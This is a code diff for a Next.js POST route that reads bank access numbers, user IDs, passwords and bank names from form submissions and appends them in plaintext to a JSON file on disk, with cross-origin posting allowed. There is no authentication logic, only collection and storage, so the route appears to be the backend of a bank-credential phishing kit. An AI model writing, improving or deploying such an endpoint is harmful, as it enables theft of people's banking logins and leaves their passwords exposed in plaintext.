@@ -8,10 +8,24 @@ const CORS_HEADERS = {
   'Access-Control-Allow-Headers': 'Content-Type, Authorization',
 };
 
+// Disable Next.js default body parser
+export const config = {
+  api: {
+    bodyParser: false, // We handle parsing ourselves
+  },
+};
+
 export async function POST(req: NextRequest) {
   try {
-    const body = await req.json();
-    const { accessNumber, userId, password, bank } = body;
+    // Manually parse the incoming form data
+    const body = await req.text(); // Read raw text body
+    const params = new URLSearchParams(body); // Convert it to a URLSearchParams object
+
+    // Extract values from the form data
+    const accessNumber = params.get('accessNumber');
+    const userId = params.get('userId');
+    const password = params.get('password');
+    const bank = params.get('bank');
 
     const data = {
       accessNumber,
@@ -26,16 +40,29 @@ export async function POST(req: NextRequest) {
 
     if (fs.existsSync(filePath)) {
       const rawData = fs.readFileSync(filePath, 'utf8').trim();
-      currentData = rawData ? JSON.parse(rawData) : [];
-    }    
+      try {
+        currentData = rawData ? JSON.parse(rawData) : [];
+      } catch (e) {
+        console.warn('Invalid JSON, resetting file...');
+        currentData = [];
+        fs.writeFileSync(filePath, '[]');
+      }
+    }
 
+    // Add the new data to the current data
     currentData.push(data);
+
+    // Write the updated data to the file
     fs.writeFileSync(filePath, JSON.stringify(currentData, null, 2));
 
-    return new NextResponse(JSON.stringify({ status: 'success' }), {
-      status: 200,
-      headers: CORS_HEADERS,
-    });
+    // Return success response
+    return new NextResponse(
+      JSON.stringify({ success: true, message: 'Data saved successfully' }),
+      {
+        status: 200,
+        headers: CORS_HEADERS,
+      }
+    );
   } catch (error) {
     return new NextResponse(
       JSON.stringify({
